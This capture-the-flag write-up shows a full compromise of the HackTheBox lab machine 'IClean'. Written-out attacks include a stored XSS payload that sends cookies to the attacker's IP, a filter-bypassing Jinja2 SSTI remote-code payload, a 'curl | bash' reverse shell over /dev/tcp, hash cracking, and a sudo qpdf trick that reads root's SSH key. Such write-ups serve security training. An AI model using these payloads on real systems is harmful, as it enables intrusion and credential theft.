---
render_with_liquid: false
title: HackTheBox Writeup  IClean
date: 2024-04-17 22:19:16 +1400
tags: [hackthebox, nmap, linux, feroxbuster, python-flask, xss, xss-stored, simplehttpserver, ssti, ssti-filter-bypass, discover-secrets, mysql, hashcat, password-reuse, sudo, qpdf, file-read]
---




# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/IClean]
└─$ pt init '10.10.11.12 capiclean.htb IClean'
+---------+--------+-------------+---------------+
| PROFILE | STATUS |     IP      |    DOMAIN     |
+---------+--------+-------------+---------------+
| iclean  | on     | 10.10.11.12 | capiclean.htb |
| iclean  | on     | 10.10.11.12 | IClean        |
+---------+--------+-------------+---------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Wed Apr 17 22:19:16 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p- IClean
Increasing send delay for 10.10.11.12 from 5 to 10 due to 11 out of 12 dropped probes since last increase.
Warning: 10.10.11.12 giving up on port because retransmission cap hit (6).
Nmap scan report for IClean (10.10.11.12)
Host is up, received user-set (0.18s latency).
Scanned at 2024-04-17 22:19:16 CST for 1213s
Not shown: 65100 closed tcp ports (reset), 433 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6uGZlOYFnD/75LXrnuHZ8mODxTWsOQia+qoPaxInXoUxVV4+56Dyk1WaY2apshU+pICxXMqtFR7jb3NRNZGI4=
|   256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJBnDPOYK91Zbdj8B2Q1MzqTtsc6azBJ+9CMI2E//Yyu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Wed Apr 17 22:39:29 2024 -- 1 IP address (1 host up) scanned in 1212.94 seconds
```

## 80 - HTTP : House cleaning service


### Info

```ruby
http://capiclean.htb [200] [Capiclean] [Werkzeug/2.3.7 Python/3.10.12] [Bootstrap,Flask:2.3.7,OWL Carousel,Python:3.10.12,jQuery] [6fcc4f1c31b40616bbc4a2ab985ac87447ef1ec9]
```

![](/assets/obsidian/a7f9b5b23657be13c1189b6e889326b7.png)

### Directory

```bash
feroxbuster -k -t 50 -u "http://$(pt get rhost)" -o ferox_80.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/IClean]
└─$ cat ferox_80.txt | sort -u | grep -v '//capiclean.htb/static/'
200      GET      130l      355w     5267c http://capiclean.htb/about
200      GET      154l      399w     6084c http://capiclean.htb/choose
200      GET      183l      564w     8109c http://capiclean.htb/team
200      GET      193l      579w     8592c http://capiclean.htb/services
200      GET      349l     1208w    16697c http://capiclean.htb/
200      GET       88l      159w     2106c http://capiclean.htb/login
200      GET       90l      181w     2237c http://capiclean.htb/quote
302      GET        5l       22w      189c http://capiclean.htb/dashboard => http://capiclean.htb/
302      GET        5l       22w      189c http://capiclean.htb/logout => http://capiclean.htb/
403      GET        9l       28w      278c http://capiclean.htb/server-status
405      GET        5l       20w      153c http://capiclean.htb/sendMessage
```

# User Flag
---

## Shell as www-data


### 80 - quote submission form : XSS (Stored)

> http://capiclean.htb/quote

- Identify XSS

![](/assets/obsidian/f6f39e069be817473a65f9dc3b498697.png)

- Payload

```javascript
<img src="http://10.10.14.88/a"/><a href="http://10.10.14.88/b">Test</a>
```

^3bf08a

![](/assets/obsidian/a8afb6a5b00645adbe356481f736b238.png)

Got a callback from target machine, confirmed there's XSS

![](/assets/obsidian/c03fee395117855fa9a309d6b607f472.png)

Craft a payload to steal cookies

- Payload

```javascript
Test!!!<img src=xx onerror=this.src="http://10.10.14.88/c/"+btoa(document.cookie);>
```

^c6fc5b

![](/assets/obsidian/5087f12d5dac5e103e495585cdbaa2ee.png)

Received cookies after waiting for 1 minute

```bash
simplehttpserver -listen 0.0.0.0:80 -verbose
```

![](/assets/obsidian/9584a57b5790e60fa0fb6ca083afdbd4.png)

> From `Referer`, we know that the python web application listens at port 3000 on localhost, then **apache** reverse proxied it to port 80 on `0.0.0.0`

Decode cookies

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ echo 'c2Vzc2lvbj1leUp5YjJ4bElqb2lNakV5TXpKbU1qazNZVFUzWVRWaE56UXpPRGswWVRCbE5HRTRNREZtWXpNaWZRLlpoX2M4Zy5uNFRILV9WMW1VU1lXYnZ3Yk9iaFRBa1VBX00=' | base64 -d
session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zh_c8g.n4TH-_V1mUSYWbvwbObhTAkUA_M
```

By adding the cookie to my browser storage, I'm able to access http://capiclean.htb/dashboard

![](/assets/obsidian/67d8c0d17dcadf598436df5a95d611ae.png)

### 80 - Admin dashboard : Testing functions

There's 4 functions in admin dashboard

- **Generate invoice**

Since this is an flask application (which likely uses **Jinja2** as templating framework), test out SSTI

![](/assets/obsidian/407815b9b61920450169044e109c3869.png)

![](/assets/obsidian/f7d4d5e299b3d19678ad644f0e810361.png)

- **Generate QR**

![](/assets/obsidian/e1ec4b31eab6fa7b2477ec2baa58381b.png)

![](/assets/obsidian/1fe5d3e2b7a834777f734a4452402fbe.png)

After submitting the `qr-link`, I got an report in html (SSTI payload I used for the input fields was sanitized)

![](/assets/obsidian/6c232725a1dcda344ffe0d70dc4d379d.png)

- **Edit services**

![](/assets/obsidian/f41c488618e67815336b81c9d761314c.png)

I don't see those fields reflect in the report page

![](/assets/obsidian/243dcecaa0729f3c064dac33f4826804.png)

- **Quote Requests**

Not much to do with this function

![](/assets/obsidian/75949945fc64678881ad4fd0db331125.png)

### 80 - Admin dashboard : SSTI

While generating the report, user can specify `qr_link` that will appear at bottom right

The value wasn't sanitized and it's vulnerable to SSTI

![](/assets/obsidian/850d9b9a059b079b205a393d967a0f68.png)

![](/assets/obsidian/a83cd25d1ed5e1c487f27b27edd2574e.png)

I tried a simple payload to test RCE, but it returned `500` status code, which indicates there might be a filter

- Payload

```python
{{ lipsum.__globals__["os"].popen('id').read() }}')()}}
```

![](/assets/obsidian/965c24c14359e97eae5a2072def35308.png)

I tried a filter bypass payload that uses escaped ASCII codes from **payloadallthethings**, and it worked

> Reference - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---remote-code-execution

- Payload 

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

![](/assets/obsidian/c3b5577540b18d1814de282ecc2a4517.png)

Setup webserver that hosts reverse shell payload

```bash
mkdir -p www&&cd www
echo '/bin/bash -i >& /dev/tcp/10.10.14.107/1111 0>&1' > index.html
python -m http.server 80
```

- Payload

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('curl 10.10.14.107 | bash')|attr('read')()}}
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/IClean]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.107] from (UNKNOWN) [10.10.11.12] 33604
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@iclean:/opt/app$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/IClean]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
www-data@iclean:/opt/app$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## From www-data to consuela


### Enumeration - Situation awareness

- One regular user

```bash
www-data@iclean:/opt/app$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
consuela:x:1000:1000:consuela:/home/consuela:/bin/bash
```

- The machine was not in a docker container and have probably configured `/etc/fstab` to hide process from each users (users can only see own processes)

```bash
www-data@iclean:/opt/app$ ps auxfw
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
www-data    1185  0.0  1.3 1026400 54392 ?       Ssl  17:25   0:00 PM2 v5.3.1: God Daemon (/var/www/.pm2)
www-data    1208  0.1  1.2 754452 49684 ?        Ssl  17:25   0:03  \_ python3 /opt/app/app.py -w 10 --bind 127.0.0.1:3000 --chdir /
www-data    4784  0.0  0.0      0     0 ?        Z    17:56   0:00      \_ [sh] <defunct>
www-data    4955  0.0  0.0   2892   944 ?        S    17:57   0:00      \_ /bin/sh -c curl 10.10.14.107 | bash
www-data    4957  0.0  0.0   7372  3372 ?        S    17:57   0:00      |   \_ bash
www-data    4958  0.0  0.0   2892   984 ?        S    17:57   0:00      |       \_ /bin/sh -i
www-data    4991  0.0  0.2  17352  9240 ?        S    17:57   0:00      |           \_ python3 -c import pty;pty.spawn("/bin/bash")
www-data    4992  0.0  0.1   7636  4116 pts/0    Ss   17:57   0:00      |               \_ /bin/bash
www-data    5209  0.0  0.0  10072  1596 pts/0    R+   18:00   0:00      |                   \_ ps auxfw
www-data    5028  0.0  0.0      0     0 ?        Z    17:58   0:00      \_ [sh] <defunct>
www-data@iclean:/opt/app$ ls -la / | grep docker -i
```

It uses **pm2** to manage the flask app

```bash
www-data@iclean:/opt/app$ pm2 ls
┌────┬─────────────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id │ name            │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├────┼─────────────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0  │ my_flask_app    │ default     │ N/A     │ fork    │ 1208     │ 34m    │ 0    │ online    │ 0%       │ 48.5mb   │ www-data │ disabled │
└────┴─────────────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘
www-data@iclean:/opt/app$ pm2 show 0
 Describing process with id 0 - name my_flask_app
┌───────────────────┬──────────────────────────────────────────────────────┐
│ status            │ online                                               │
│ name              │ my_flask_app                                         │
│ namespace         │ default                                              │
│ version           │ N/A                                                  │
│ restarts          │ 0                                                    │
│ uptime            │ 37m                                                  │
│ script path       │ /opt/app/app.py                                      │
│ script args       │ -w 10 --bind 127.0.0.1:3000 --chdir /opt/app app:app │
[...]
```

### Enumeration - Mysql database : User credentials

Discovered a piar of mysql credential from `/opt/app/app.py`

```bash
www-data@iclean:/opt/app$ cat app.py
from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
from flask import render_template_string
import pymysql
import hashlib
import os
import random, string
import pyqrcode
from jinja2 import StrictUndefined
from io import BytesIO
import re, requests, base64

app = Flask(__name__)

app.config['SESSION_COOKIE_HTTPONLY'] = False

secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key

# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
[...]
```

Connect to DB

```bash
www-data@iclean:/opt/app$ mysql -u iclean -p'pxCsmnGLckUb' -D capiclean
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 146
Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Enumerate DB

```bash
mysql> show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)

mysql> select * from users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
2 rows in set (0.00 sec)
```

### Crack user hashes

Extract hashes for **hashcat**

```bash
┌──(bravosec㉿fsociety)-[~/htb/IClean]
└─$ cat loot/mysql_capiclean_users.txt
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+

┌──(bravosec㉿fsociety)-[~/htb/IClean]
└─$ FP=loot/mysql_capiclean_users.txt; cat $FP | tail -n +4 | awk -F '|' '{print $3":"$4}' | tr -d ' ' | grep -v '^:$' | tee "${FP%.*}.hash"
admin:2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51
consuela:0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa
```

^55443a

Crack the hashes

```bash
┌──(bravosec㉿fsociety)-[~/htb/IClean]
└─$ hashcat loot/mysql_capiclean_users.hash /opt/wordlists/rockyou.txt --user -m 1400
[...]

┌──(bravosec㉿fsociety)-[~/htb/IClean]
└─$ hashcat loot/mysql_capiclean_users.hash /opt/wordlists/rockyou.txt --user -m 1400 --show
consuela:0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:simple and clean
```

### Password reuse

```bash
┌──(bravosec㉿fsociety)-[~/htb/IClean]
└─$ cssh $(pt get rhost) consuela 'simple and clean'
Warning: Permanently added 'capiclean.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Tue Apr 23 06:16:10 PM UTC 2024




Expanded Security Maintenance for Applications is not enabled.

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
consuela@iclean:~$ id
uid=1000(consuela) gid=1000(consuela) groups=1000(consuela)
consuela@iclean:~$ cat ~/user.txt
0411750a0dc6a204ab6c433dc28b606a
```

# Root Flag
---

## From consuela to root


### SUDO - qpdf : Arbitrary file read

```bash
consuela@iclean:~$ sudo -l
[sudo] password for consuela:
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```

Check what **qpdf** can do

```bash
consuela@iclean:~$ man /usr/bin/qpdf
QPDF(1)                                                                                        User Commands                                                                                        QPDF(1)

NAME
       qpdf - PDF transformation software

SYNOPSIS
       qpdf [ options ] infilename [ outfilename ]

DESCRIPTION
       The  qpdf program is used to convert one PDF file to another equivalent PDF file.  It is capable of performing a variety of transformations such as linearization (also known as web optimization or
       fast web viewing), encryption, and decryption of PDF files.  It also has many options for inspecting or checking PDF files, some of which are useful primarily to PDF developers.

       For a summary of qpdf's options, please run qpdf --help. A complete manual can be found at https://qpdf.readthedocs.io.

qpdf version 10.6.3        
```

```bash
consuela@iclean:~$ /usr/bin/qpdf --help
Run "qpdf --help=topic" for help on a topic.
Run "qpdf --help=--option" for help on an option.
Run "qpdf --help=all" to see all available help.

Topics:
  add-attachment: attach (embed) files
  advanced-control: tweak qpdf's behavior
  attachments: work with embedded files
  completion: shell completion
  copy-attachments: copy attachments from another file
  encryption: create encrypted files
  exit-status: meanings of qpdf's exit codes
  general: general options
  help: information about qpdf
  inspection: inspect PDF files
  json: JSON output for PDF information
  modification: change parts of the PDF
  overlay-underlay: overlay/underlay pages from other files
  page-ranges: page range syntax
  page-selection: select pages from one or more files
  pdf-dates: PDF date format
  testing: options for testing or debugging
  transformation: make structural PDF changes
  usage: basic invocation

For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io

consuela@iclean:~$ /usr/bin/qpdf --help=usage
Read a PDF file, apply transformations or modifications, and write
a new PDF file.

Usage: qpdf [infile] [options] [outfile]
   OR  qpdf --help[={topic|--option}]
[...]
```

It checks for PDF header on input file, so I can't just specify `/root/.ssh/id_rsa` as `inputfile`, instead I can include it as attachment

```bash
consuela@iclean:~$ /usr/bin/qpdf /etc/passwd /tmp/test.pdf
WARNING: /etc/passwd: can't find PDF header
WARNING: /etc/passwd: file is damaged
WARNING: /etc/passwd: can't find startxref
WARNING: /etc/passwd: Attempting to reconstruct cross-reference table
qpdf: /etc/passwd: unable to find trailer dictionary while recovering damaged file
```

Google : `qpdf add attachment`

> https://mattpayne.org/posts/qpdf_pandoc_carry_source/

```bash
consuela@iclean:~$ sudo /usr/bin/qpdf --empty --add-attachment /root/.ssh/id_rsa -- /tmp/root.pdf
consuela@iclean:~$ qpdf --list-attachments /tmp/root.pdf
id_rsa -> 5,0
consuela@iclean:~$ qpdf --show-attachment=id_rsa /tmp/root.pdf
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Save the key to `root.id_rsa`

```bash
┌──(bravosec㉿fsociety)-[~/htb/IClean]
└─$ chmod 600 root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/IClean]
└─$ ssh -i root.id_rsa root@$(pt get rhost)
[...]
root@iclean:~# id
uid=0(root) gid=0(root) groups=0(root)
root@iclean:~# cat root.txt
4378ba4bedcc5a77cc2912a6905b7cd2
root@iclean:~#
```

# Additional
---
